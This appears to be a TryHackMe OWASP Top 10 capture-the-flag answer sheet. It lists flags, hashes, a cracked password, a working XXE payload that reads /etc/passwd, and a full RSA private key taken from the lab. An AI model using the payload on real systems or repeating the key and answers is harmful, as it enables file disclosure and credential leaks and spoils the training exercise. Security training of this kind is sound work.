# Open Web Application Security Project [OWASP]
[![Head](./assets/head.png)](https://tryhackme.com/r/room/owasptop10)

Further materials: 

## [Severity 1] Command Injection Practical
1. strange text file : drpepper.txt
2. The table helps in solving the question 2
| Feature               | Root User       | Daemon Users              | Root Services            |
|-----------------------|-----------------|---------------------------|--------------------------|
| **Username**          | `root`         | Service-related (`mysql`) | N/A                      |
| **UID**               | `0`            | > `0` and < `1000`        | Run by `root` user       |
| **Home Directory**    | `/root`        | `/var/lib/`, `/nonexistent` | N/A                      |
| **Login Access**      | Full           | Disabled (`nologin`)      | Interactive or automated |
| **Purpose**           | System admin   | Running background tasks  | Critical services as root|

3. www-data
4. /usr/sbin/nologin
5. 18.04.4
6. DR PEPPER


## [Severity 2] Broken Authentication Practical
1. fe86079416a21a3c99937fea8874b667
2. d9acOf7db4fda460ac3edeb75d75e16e

## [Severity 3] Sensitive Data Exposure (Challenge)
1. /assets
2. webapp.db
3. 6eea9b7ef19179a06954edd0f6c05ceb
4. qwertyuiop
5. THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## [Severity 4] XML External Entity Task-15
```payload
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
3. falcon
4. /home/falcon/.ssh/id_rsa
5. MIIEogIBAAKCAQEA7b

-----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB 2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5 bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya 6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g 83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm 9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ 9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA= -----END RSA PRIVATE KEY-----

## [Severity 5] Broken Access Control (IDOR Challenge)
1. -
2. -
3. flag{fivefourthree}

## [Severity 6] Security Misconfiguration
1. -
2. -
3. thm{4b9513968fd564a87b28aa1f9d672e17}

## [Severity 7] XSS
1. -
2. ThereIsMoreToXSSThanYouThink
3. ReflectiveXss4TheWin
